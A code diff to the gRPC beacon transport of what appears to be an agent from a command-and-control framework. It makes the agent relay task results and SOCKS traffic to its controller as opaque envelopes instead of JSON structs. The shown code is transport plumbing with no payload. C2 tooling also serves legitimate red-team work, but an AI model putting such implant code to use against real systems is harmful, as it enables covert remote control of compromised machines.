@@ -5,14 +5,12 @@ package main
 
 import (
 	"context"
-	"encoding/json"
 	"fmt"
 	"strings"
 	"sync"
 	"time"
 
 	"github.com/forgec2/forgec2/pkg/c2pb"
-	"github.com/forgec2/forgec2/pkg/protocol"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials"
 	"google.golang.org/grpc/credentials/insecure"
@@ -55,6 +53,7 @@ func initGRPCClient(rawURL string) error {
 		grpc.WithDefaultCallOptions(
 			grpc.MaxCallRecvMsgSize(16*1024*1024),
 			grpc.MaxCallSendMsgSize(16*1024*1024),
+			grpc.ForceCodec(c2pb.JSONCodec),
 		),
 	}
 
@@ -105,19 +104,8 @@ func grpcSendBeacon(body []byte) ([]byte, error) {
 		return nil, fmt.Errorf("gRPC not initialized")
 	}
 
-	var req protocol.BeaconRequest
-	if err := json.Unmarshal(body, &req); err != nil {
-		return nil, fmt.Errorf("unmarshal request: %w", err)
-	}
-
 	if Debug {
-		trunc := req.UUID
-		if len(trunc) > 8 {
-			trunc = trunc[:8]
-		}
-		logDebugf("[gRPC] Sending beacon (agent=%s, results=%d, socks=%d)",
-			trunc+"...",
-			len(req.Results), len(req.SocksData))
+		logDebugf("[gRPC] Sending beacon (%d bytes)", len(body))
 	}
 
 	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
@@ -128,7 +116,9 @@ func grpcSendBeacon(body []byte) ([]byte, error) {
 		return nil, fmt.Errorf("gRPC stream open failed: %w", err)
 	}
 
-	if err := stream.Send(&req); err != nil {
+	// The envelope is relayed verbatim (opaque bytes): handshake/registration
+	// frames carry mac/secret_id fields that a struct round-trip would drop.
+	if err := stream.Send(&c2pb.Envelope{Payload: body}); err != nil {
 		return nil, fmt.Errorf("gRPC send failed: %w", err)
 	}
 
@@ -137,16 +127,11 @@ func grpcSendBeacon(body []byte) ([]byte, error) {
 		return nil, fmt.Errorf("gRPC recv failed: %w", err)
 	}
 
-	respJSON, err := json.Marshal(resp)
-	if err != nil {
-		return nil, fmt.Errorf("marshal response: %w", err)
-	}
-
 	if Debug {
-		logDebugf("[gRPC] Received response (%d bytes, %d tasks)", len(respJSON), len(resp.Tasks))
+		logDebugf("[gRPC] Received response (%d bytes)", len(resp.Payload))
 	}
 
-	return respJSON, nil
+	return resp.Payload, nil
 }
 
 func sendGRPCBeacon(body []byte) []byte {
